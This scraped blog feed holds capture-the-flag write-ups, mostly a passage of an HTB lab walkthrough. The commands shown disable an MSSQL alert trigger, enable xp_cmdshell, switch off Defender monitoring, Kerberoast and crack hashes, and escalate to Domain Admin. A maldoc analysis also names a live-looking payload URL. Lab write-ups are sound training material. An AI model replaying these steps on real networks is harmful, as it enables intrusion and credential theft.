flag.INFORMATION_SCHEMA.TABLES; table_schema ------------ dbo SQL (df dbo@master)\u0026gt; select * from flag.dbo.flag flag ---------------------------------------- b\u0026#39;POO{[REDACTED]}\u0026#39; BackTrack #\rNow that I’m sa on the database, I want to get a shell on the host. I’ll try xp_cmdshell, but it fails.\nSQL (df dbo@master)\u0026gt; xp_cmdshell whoami ERROR(COMPATIBILITY\\POO_PUBLIC): Line 1: SQL Server blocked access to procedure \u0026#39;sys.xp_cmdshell\u0026#39; of component \u0026#39;xp_cmdshell\u0026#39; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of \u0026#39;xp_cmdshell\u0026#39; by using sp_configure. For more information about enabling \u0026#39;xp_cmdshell\u0026#39;, search for \u0026#39;xp_cmdshell\u0026#39; in SQL Server Books Online. it could be the command is disabled, lets try to enable it.\nSQL (df dbo@master)\u0026gt; enable_xp_cmdshell INFO(COMPATIBILITY\\POO_PUBLIC): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. ERROR(COMPATIBILITY\\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell detected. Database Administrators will be notified! ERROR(COMPATIBILITY\\POO_PUBLIC): Line 181: The transaction ended in the trigger. The batch has been aborted. Trying the manual way, I still got the same error.\nSQL (df dbo@master)\u0026gt; sp_configure \u0026#39;show advanced options\u0026#39;, \u0026#39;1\u0026#39; INFO(COMPATIBILITY\\POO_PUBLIC): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. SQL (df dbo@master)\u0026gt; reconfigure SQL (df dbo@master)\u0026gt; sp_configure \u0026#39;xp_cmdshell\u0026#39;, \u0026#39;1\u0026#39; ERROR(COMPATIBILITY\\POO_PUBLIC): Line 11: Attempt to enable xp_cmdshell detected. Database Administrators will be notified! ERROR(COMPATIBILITY\\POO_PUBLIC): Line 181: The transaction ended in the trigger. The batch has been aborted. These triggers serve as a policy designed to alert and prevent attempts to enable and use xp_cmdshell. The issue is that, as the sa user, I have the ability to disable these triggers. Triggers can be found in sys.server_triggers :\nSQL (df dbo@master)\u0026gt; select name from sys.server_triggers; name ----------------- ALERT_xp_cmdshell I just need the syntax to disable it.\nSQL (df dbo@master)\u0026gt; disable trigger ALERT_xp_cmdshell on all server SQL (df dbo@master)\u0026gt; with that, we can now enable xp_cmdhsell and it worked as seen below.\nSQL (df dbo@master)\u0026gt; enable_xp_cmdshell INFO(COMPATIBILITY\\POO_PUBLIC): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. INFO(COMPATIBILITY\\POO_PUBLIC): Line 185: Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 1 to 1. Run the RECONFIGURE statement to install. SQL (df dbo@master)\u0026gt; xp_cmdshell whoami output --------------------------- nt service\\mssql$poo_public NULL Privilege escalation #\rmssql$poo_public has limited access. While there is a home directory, it is empty. The user has some access to the web directory, but the most notable file, \\inetput\\wwwroot\\web.config, returns an access denied error:\nSQL (df dbo@master)\u0026gt; xp_cmdshell type C:\\inetpub\\wwwroot\\web.config output ----------------- Access is denied. NULL It appears that when a web server is configured to run the stored procedure sp_execute_external_script under a different user account, it allows for certain operations. The syntax for executing the script is quite straightforward:\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;whoami\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: compatibility\\poo_public01 Express Edition will continue to be enforced. Now we can run as poo_public01. Lets try to read the web.config file to see if we can find anything of interest to us.\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;type \\inetpub\\wwwroot\\web.config\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;system.webServer\u0026gt; \u0026lt;staticContent\u0026gt; \u0026lt;mimeMap fileExtension=\u0026#34;.DS_Store\u0026#34; mimeType=\u0026#34;application/octet-stream\u0026#34; /\u0026gt; \u0026lt;/staticContent\u0026gt; \u0026lt;!-- \u0026lt;authentication mode=\u0026#34;Forms\u0026#34;\u0026gt; \u0026lt;forms name=\u0026#34;login\u0026#34; loginUrl=\u0026#34;/admin\u0026#34;\u0026gt; \u0026lt;credentials passwordFormat = \u0026#34;Clear\u0026#34;\u0026gt; \u0026lt;user name=\u0026#34;Administrator\u0026#34; password=\u0026#34;EverybodyWantsToWorkAtP.O.O.\u0026#34; /\u0026gt; \u0026lt;/credentials\u0026gt; \u0026lt;/forms\u0026gt; \u0026lt;/authentication\u0026gt; --\u0026gt; \u0026lt;/system.webServer\u0026gt; \u0026lt;/configuration\u0026gt; Express Edition will continue to be enforced. As seen above, the file contains creds for the administrator account. These could work to get past the basic auth at /admin and return the next flag.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ curl -s http://administrator:EverybodyWantsToWorkAtP.O.O.@10.13.38.11/admin/ \u0026#34;I can\u0026#39;t go back to yesterday, because i was a different person then...\u0026#34;\u0026lt;br\u0026gt; - Alice in Wonderland\u0026lt;br\u0026gt; \u0026lt;br\u0026gt; Flag : POO{[redacted]} Foothold #\rLocal Enumeration #\rIt took some time to piece everything together. Initially, I found that the host is listening on WinRM, TCP port 5985, for both IPv4 and IPv6 connections:\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;netstat -ano\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 1004 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 4788 TCP 0.0.0.0:5357 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:41433 0.0.0.0:0 LISTENING 4540 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 592 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 1356 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 720 INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 1860 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 2508 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 720 TCP 0.0.0.0:49672 0.0.0.0:0 LISTENING 712 TCP 10.13.38.11:80 10.10.14.172:32772 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32782 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32794 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32798 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32806 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32822 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32828 TIME_WAIT 0 TCP 10.13.38.11:80 10.10.14.172:32834 TIME_WAIT 0 ..[snip]... Although the initial nmap scan did not show the 5985 listening on IPV4, as seen above, we have winrm actively listening. To check further, I was required to get the IPV6 address of the machine using ipconfig in order for us to scan it using nmap to see if truly winrm is actively listening on the host.\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;ipconfig\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::1001 IPv6 Address. . . . . . . . . . . : dead:beef::7ef0:e82c:6a2:1f2f Link-local IPv6 Address . . . . . : fe80::8d5a:640b:98c7:f8de%8 IPv4 Address. . . . . . . . . . . : 10.13.38.11 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : dead:beef::1 fe80::250:56ff:feb0:8205%8 10.13.38.2 Ethernet adapter Ethernet1 2: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 172.20.128.101 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : Express Edition will continue to be enforced. below is the result of the nmap scan which shows clearly, winrm is listening.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─$ nmap -sCV -p- -6 dead:beef::1001 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 07:27 EAT Stats: 0:07:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 98.54% done; ETC: 07:35 (0:00:07 remaining) Stats: 0:07:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 98.58% done; ETC: 07:35 (0:00:07 remaining) Nmap scan report for dead:beef::1001 Host is up (0.29s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-server-header: | Microsoft-HTTPAPI/2.0 |_ Microsoft-IIS/10.0 |_http-title: Bad Request 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+ | ms-sql-info: | dead:beef::1001:1433: | Version: | name: Microsoft SQL Server 2017 RTM+ | number: 14.00.2056.00 | Product: Microsoft SQL Server 2017 | Service pack level: RTM | Post-SP patches applied: true |_ TCP port: 1433 |_ssl-date: 2024-10-07T04:35:50+00:00; +3s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-10-06T09:29:44 |_Not valid after: 2054-10-06T09:29:44 | ms-sql-ntlm-info: | dead:beef::1001:1433: | Target_Name: POO | NetBIOS_Domain_Name: POO | NetBIOS_Computer_Name: COMPATIBILITY | DNS_Domain_Name: intranet.poo | DNS_Computer_Name: COMPATIBILITY.intranet.poo | DNS_Tree_Name: intranet.poo |_ Product_Version: 10.0.17763 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Bad Request |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2s, deviation: 0s, median: 2s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 499.29 seconds I can establish a connection over WinRM using Evil-WinRM. To facilitate an IPv6 connection, I’ll add the IP address to my local /etc/hosts file. The hostname returned by the box is COMPATIBILITY:\nSQL (df dbo@master)\u0026gt; EXEC sp_execute_external_script @language =N\u0026#39;Python\u0026#39;, @script = N\u0026#39;import os; os.system(\u0026#34;hostname\u0026#34;);\u0026#39;; INFO(COMPATIBILITY\\POO_PUBLIC): Line 0: STDOUT message(s) from external script: COMPATIBILITY Express Edition will continue to be enforced. as seen below, we have added the IP to our /etc/hosts/ file on our attacker machine.\n127.0.0.1 localhost 127.0.1.1 v1c70r # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.129.141.23 unika.htb 10.129.3.186 thetoppers.htb 10.129.3.186 s3.thetoppers.htb dead:beef::1001 COMPATIBILITY Its time to connect to our comprised host as shown below.\n┌──(root㉿v1c70r)-[/home/…/HTB Prolabs/P.O.O/web enum/IIS_shortname_Scanner] └─# evil-winrm -i compatibility -u administrator -p \u0026#39;EverybodyWantsToWorkAtP.O.O.\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; It is time to get our foothold flag.\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; ls Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/26/2018 5:29 PM 37 flag.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; type flag.txt POO{[REDACTED]} *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; p00ned #\rFirst, I started by enumerating my privilieges with the admin user.\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID =========================== ========================================== compatibility\\administrator S-1-5-21-158512341-328150952-995267585-500 GROUP INFORMATION ----------------- Group Name Type SID Attributes ============================================================= ================ ============ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======= SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeSecurityPrivilege Manage auditing and security log Enabled SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeSystemProfilePrivilege Profile system performance Enabled SeSystemtimePrivilege Change the system time Enabled SeProfileSingleProcessPrivilege Profile single process Enabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled SeCreatePagefilePrivilege Create a pagefile Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeDebugPrivilege Debug programs Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeUndockPrivilege Remove computer from docking station Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled SeCreateSymbolicLinkPrivilege Create symbolic links Enabled SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. As seen above, it is clear we are a local admin user of the system. We will now use this hos as our jump point to other hosts. below is the address of the machine\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::1001 IPv6 Address. . . . . . . . . . . : dead:beef::7ef0:e82c:6a2:1f2f Link-local IPv6 Address . . . . . : fe80::8d5a:640b:98c7:f8de%8 IPv4 Address. . . . . . . . . . . : 10.13.38.11 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : dead:beef::1 fe80::250:56ff:feb0:8205%8 10.13.38.2 Ethernet adapter Ethernet1 2: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 172.20.128.101 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : Kerberoasting #\rNext, I decided to perform some kerberoasting in order to get some tickets we could use to get access to another user but first, I had to disable realtime monitoring as shown below.\n*Evil-WinRM* PS C:\\users\u0026gt; set-mppreference -disablerealtimemonitoring $true After uploading our powershell script onto the host machine, we shall run it from the sql server as shown below.\nSQL (df dbo@master)\u0026gt; xp_cmdshell powershell -c import-module C:\\Temp\\invoke-kerberoast.ps1; invoke-kerberoast output -------------------------------------------------------------------------------- NULL NULL TicketByteHexStream : Hash : $krb5tgs$HR_peoplesoft/intranet.poo:1433:A175CE2658B987C0FE5CE7CE9380303E$C82FEE2FB0F43648D7C3BD 10BE84A19E8953E7EE295D224E38F89B6B8EEDBFCF177F1E1DD8BC4CEA78B59059FC365DB3DF096BD8E7FA584BABE6DA E33C2F3EF1654958DECBF025C651B2CB4016071CE78D505DEE1A9893C1D64215D663324B15F01FEA7CCFB9D3979391E4 D05FDEA0E70575BC8A48FBC1885D9097416F778B07F696203AA818125C0FD2223F721056AE444C1AA10AE3151BAE1757 3A276625C78B2A46DC5F24054541CBD4A7E6FA67082D885F212C2CB132432AD5BD64BDD5063F0AFAC505703703B20B3E E1E369BDC8281F679B07949474B7C22C498E77ADBB54D9362FBE00AA8678AE180C4713973A08B94DA1A3808EE70B68C6 0D75DC5348DF0BD321FAD17FDA36D7BA4AFD197365958CDE3CEF076EDC90863B1F27CB038D64FEFEE179654C93545A14 AB02CE6E821022D1EFDE08FA58B95D6726724DB02519224E34AAF7C20C165858A28D0EBB4EC1634272CD74610ABDCD11 8898C407FEA9B9B82C539C4FD6465B09C8188A340FE8668E987D4E009D4D8672FD68AD828D3A2F011700B7FEE42C9934 0995A3D6C29442B83ACD453611955E600ACBCEDA6E9FAB078C53954DCC801AD17656CFDDCF0FC7A656FBF67FDE9516CD 3D3E255262841D6C25C52C81472ECE2C16F98CD957996D2C3CA5604F918C58F8EA2D1163D51AF36E9C3DF496442D604B D31A7D8E3CE1093C47009ADF930A9CF736249D42EE289FBFB9636CD129E8D992C3FFE651CC94046FD1593AD1CD9236F2 DD29E22EE389E56FF702783CA9EE4E7A5BAEC5F647F1EB34E26D98AF57E1C3F84DC83B4C851F5F867FB89CEFCB717679 2AA840F594D946006F5F8C86EB5EB3F1AD50469A769817930A7F4027DFE852B6F235EEC086F88DB38DCF68F889D62388 6683C43C6F52123B6337C16FCF8A23162E21C74A335D5C143292F801DAA42C9469A73F63C245E18A6BCCF779AD82BCA9 EC5D4DC80271D6A8C8494906C55F66AB39DA96AC5C21F271C950940D809CE97E238C4F33486D0B566666F66BD8316602 C5332F749D54A66FFE65CA76302F2D69BD0BD73A5385BE98B006636B44B0B7BA2AA8630B311899875EBE7C97E4DDA210 E35D682924CE1EE1050D5B3E368F45223F329D1140E79DD9670454C07E6EBBF8C5BC7F52E248734F4BBA4B1CA37B4C4C 8CF9F35C937F00C4ACAF923FDF442F8699C0449023F3A15D7B37E2986B5244733BF1199D401EEC5B30E479D0D15C4984 3FCF911C8673464D8FAA70B45129F6D76FD4E4D6056E6063DC40ADA827C4F47622D3A757CC313424DECBF784E51C2A90 9B3F1E131200B4352A3802B20122F0A966C6E5606C723F3E54AC5D53AFD7252D0B115496A0C595A0F1254FCC2CCBB81B 9EE82FDFF47EB993B4D9F4749BC639853727D5A176D55A654A897E05F6FD711E7177EED89D380FC40D1733D47C7D95B0 1511F3920417D651A6D3DF606B01757B634B3876ED3219829922462B8CE47C684AE01C46E3F5023D78881BCA09F67C66 695A5065065CD9A46CB2368B7253568EE429D635829A7C376E22F34DD1E15EEB03D73AD42F41C92F848BEC6CBC422054 C05AB02CC928C7DFF27BE1B34062E0FECA422E1A0721C5672AE2A2A1F566564C61C9DD58D483705913BEA15FFF970A47 13739985CE588246F070D28B81A31AB2707CF8F6B4463DE3C7D5073140F3F6689397 SamAccountName : p00_hr DistinguishedName : CN=p00_hr,CN=Users,DC=intranet,DC=poo ServicePrincipalName : HR_peoplesoft/intranet.poo:1433 NULL TicketByteHexStream : Hash : $krb5tgs$cyber_audit/intranet.poo:443:E3A87FEF289CC540C73A52551F3C3A43$1096E4652145F6AF34174138C 6B5FA7091AC7088CB0AFBA198E5D967C7FF778045E3D7186A75125D963896F3C6A26207ADDDD9E15204182DF89498377 516EC136DE8596791CDF26E1C78F6A94DC993EC61EADDA5B7A71430E16065BB20B6D411FB373349FE6FB012FBA27A7F7 AC52D94F56F06AD072B70448AC78D7D6D17454817BFB1C5684B8A8CC8F5C71DA108618E3B549997E0CF52F5833388B20 06FE0AA2C1191D32DB7F9CC3D742B367F858A87BBBF9C54C8369366B218CAB9B6F63B094BA3FFE3CB4FE6445C2E3835A DDA544BD6A92604244199F5C73DE0191B3272BF65D4C21B04E6CB4CC0401045FEBB53FE36A2AA05FD4379D868A06AE51 EB177A2958527BCFCB48D8865E9D3192FDED6F1F8832763CEFF1700A666E479A4F043169B9FD1EE9FCAAD741ED2173A9 88D7BCA8A6A9BBAB82931DD8DCE071727BC50330627BEF3B571437006D2DA8E02BC89F4541FEEBBBECF119ACF59EBE7F BF0C36CD65B36BDFB0D27566A6D9D7E6527D896CE2C3AE84175AD3870943984017E3285C71D379B8AD162A4B4D24A3DF DFDBC479220B45254F90C3384AE946F5E239480B8C74F93C0889C653F950762AA3CA717D34D6028409975202D55E5DE1 28219423A23C8675F67FC71BEF0534932A2CC7248AECA151F019EA594AFD56B5CF910497AF67DD06AE42AB7FA8DCB7B9 BF519A47B844233238E0B1D085B110B31F055047AD4EA638B25EF4D73F1C0D2CF46CE495D4B2C8C1BBE71C9AD58B958E 71F73339114F893F0C2CDCB33BF7C0C28E1596E0A1EF450B4505EE1AE334CF6AC374E92AF6FB21B13711DAAACC6CACBB 8946F06F5C024EC5150F8402D50F732D93A3625B6A9CEEB7B134DFAC69BE4206C358E3C3B88D0469DC5CDD341BF30C87 C8336EC0A16215EB8F241CB74AD69A30EF118395173D2815CD579E43B2D181242DC85BF26111B221215317C34B82D13D 430F58C8A2B77D8D1D26F3357D2DE6BD5C109E4B16C1D29E507311F5266B7CC323252609D5C9171C04098FFB4E4AB71D 5006CE10BF7329BC0920E328FAB9621A2747587CBA14164CBD31C22CB90DA1CAF0EBDAEC40BD643245A724C62F63DDCD 93C86DF38275E90EE0BD7AC0614A033EAE597BD8131129C091946D983B57401F5AA0FEF76628992129C6C2BA744F2BBA 30477ABFEF70FF620619CBC20B60B9CB238216E33018EC972D6840896C65BACE07DDC87A4EB237108D6AD1E8BA4B13A0 98E16FDA4616A95A5B13334DB5469C8898E7790FACC14EB33671E4BED7935D21ABF80DE28F3F902A96F59470F0C530C9 D3EC61DF1CA62C8B708E7963C7ACB19424814C80C2791735B9CD7DFF5C770412C329C62D8655FDE7293C40F98D38AFCC 10543A7ECF58F6AAC5A0E5B63B3106E124EF76B5062DB4E29732098EFC937347FB0076F3AEF047BC49D188A9BE6F5B38 048AD94733B0FBF0245A337F5408A71FC2772C10B07DB4C85435949617200374F3961AEF56A2D4B929C22CE298EE9587 7159EA68A7F3E596399FB645FFE9D57CA3D49C5E77C8568927A0EFDA0B4E0A04730EB7DB98E9B1F4FD2F93621BAD87B0 7F41F2B09EA07C61AE2154AF9BB2076A2EA1C0857E2990E89103DFC81BB07D5A66541C849A3EFA2C9894CE5BE14CD9C3 0D483FDFFC6CD13BFD35E2730A91396448E9A6BE611C156C5537765A4949FA9CF SamAccountName : p00_adm DistinguishedName : CN=p00_adm,CN=Users,DC=intranet,DC=poo ServicePrincipalName : cyber_audit/intranet.poo:443 NULL NULL NULL NULL As seen above, we have two accounts with their hashes identified. We shall try to crack the hashes using hashcat as seen below.\nhashcat -m 13100 p00_adm /usr/share/wordlists/seclists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt --force --force ...[snip]... ZQ!5t4r the hash for the admin is the one that was able to crack. After getting the credentials, we shall use the newly found creds and add the p00_adm to the admins group as shown below, after uploading the powerview script from powersploit onto the host machine.\n*Evil-WinRM* PS C:\\Temp\u0026gt; upload PowerView.ps1 . Info: Uploading /home/n00b/HTB Prolabs/P.O.O/web enum/PowerView.ps1 to C:\\Temp\\. Data: 1027036 bytes of 1027036 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Temp\u0026gt; Import-Module .\\PowerView.ps1 // Here I have created a PSCredential object to add p00_adm to the admin groups domain. *Evil-WinRM* PS C:\\Temp\u0026gt; $pass = ConvertTo-SecureString \u0026#39;ZQ!5t4r\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\Temp\u0026gt; $cred = New-Object System.Management.Automation.PSCredential(\u0026#39;intranet.poo\\p00_adm\u0026#39;, $pass) *Evil-WinRM* PS C:\\Temp\u0026gt; Add-DomainGroupMember -Identity \u0026#39;Domain Admins\u0026#39; -Members \u0026#39;p00_adm\u0026#39; -Credential $cred Since p00_adm is now a domain admin, it can access the c$ share on the Domain Controller and grab the flag I found on mr3ks’s desktop.\n*Evil-WinRM* PS C:\\Temp\u0026gt; net use \\\\DC.intranet.poo\\c$ /u:intranet.poo\\p00_adm \u0026#39;ZQ!5t4r\u0026#39; The command completed successfully. *Evil-WinRM* PS C:\\Temp\u0026gt; dir \\\\DC.intranet.poo\\c$\\users\\ Directory: \\\\DC.intranet.poo\\c$\\users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/15/2018 1:20 AM Administrator d----- 3/15/2018 12:38 AM mr3ks d-r--- 11/21/2016 3:24 AM Public *Evil-WinRM* PS C:\\Temp\u0026gt; type \\\\DC.intranet.poo\\c$\\users\\mr3ks\\desktop\\flag.txt POO{[REDACTED]} ","date":"7 October 2024","externalUrl":null,"permalink":"/posts/p.o.o/","section":"Posts","summary":"Professional Offensive Operations","title":"P.O.O","type":"posts"},{"content":"","date":"30 September 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"","date":"30 September 2024","externalUrl":null,"permalink":"/categories/ctfroom/","section":"Categories","summary":"","title":"CTFROOM","type":"categories"},{"content":"","date":"30 September 2024","externalUrl":null,"permalink":"/categories/forensics/","section":"Categories","summary":"","title":"Forensics","type":"categories"},{"content":"\rIntroduction #\rIn this challenge, we are given an mp4 file that seems to be corrupted. We shall try to rectify the hex data in order to get the file. Below is the description of the challenge description.\nTask 1 #\rin order to get the first flag we had to get the correct file headers in order for the file content to be accessible. As seen below, the correct header for the file should look as seen below.\nsource: https://www.file-recovery.com/mp4-signature-format.htm\nand here is our files header.\nthe header bytes are off, we shall rectify it referring to our source image as shown earlier. However, for one to be able to view the file’s hex data, we can use a tool such as hexeditor.\nhexeditor \u0026lt;file\u0026gt; I tried to edit the header but still got nothing, it seems am editing the wrong file header. Looking at the file specification, after a long resesarch and analysis, I came to find out that the duration bit of the file was off where by I had to change the lmvh. to lmvhd as shown below.\nsource: https://www.cimarronsystems.com/wp-content/uploads/2017/04/Elements-of-the-H.264-VideoAAC-Audio-MP4-Movie-v2_0.pdf\nto make it easier for one to edit the file, one could use an online hexeditor and still get the same file. After editing, we got our file with the first flag as shown below.\nBSidesNBI{W3ll_fr33_fl4g_All_My_L0v3} but the song is weird it is played in reverse, therefore, we are required to play it backwards to get our second flag.\nTask 2 #\rI used this tool to get the second flag, under the audio tools, I chose reverse audio to get the message clearly\n{hanah_your_music_prodigy} ","date":"30 September 2024","externalUrl":null,"permalink":"/posts/the-musician/","section":"Posts","summary":"Some hex headers to rectify","title":"The Musician","type":"posts"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/ir/","section":"Tags","summary":"","title":"IR","type":"tags"},{"content":"\rIntroduction #\rIn this challenge, we are given a malicious document for us to analyze, here is the description of the challenge.\nAfter downloading the zipped folder in our controlled environment, we are required to unzip it using the password given to us.\nWe are given a file called maldoc.xlsx, however using the file to answer our questions we got wrong answers. I decided to look if there were any embed files on to the document using binwalk, and it seems to be some files embed on to it as shown below.\nyeap, there are some files embed on to our document, lets extract them using the same tool.\nTask 1 #\rwe are required to know when the file was last modified,we are required to check the actual file before extracting the embedded files for analysis, maldoc.xlsx.\nlooking at the metadata of the file, we are bale to get the modification date of the file as shown below, we have two modification dates, hence we shall consider the latest time that was modified which is\nFile Modification Date/Time : 2023:09:26 15:34:36+03:00 answer: 2023:09:26 15:34:36\nTask 2 #\rthis one was easy, we just had to use the command md5sum on the file to get the hash as shown below.\n──(n00b㉿v1c70r)-[~/…/Maldoc/_maldoc.xlsx.extracted/xl/embeddings] └─$ md5sum vKlT.JyZ 8244dd7fe06510832017d869ca1e6796 vKlT.JyZ answer: 8244dd7fe06510832017d869ca1e6796\nTask 3 #\rfor this challenge, after getting our hash, I uploaded the hash on virustotal and the cve was given to us as shown below.\nanswer: CVE-2017-11882\nTask 4 #\rafter uploading the hash on virustotal, I went under behavior and saw a certain url as shown below.\nanswer : ”http://81.161.229.226/naun.vbs”\n","date":"26 September 2024","externalUrl":null,"permalink":"/posts/maldoc/","section":"Posts","summary":"Credit CTFROOM","title":"Maldoc","type":"posts"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/malware-anlaysis/","section":"Tags","summary":"","title":"Malware Anlaysis","type":"tags"},{"content":"","date":"25 September 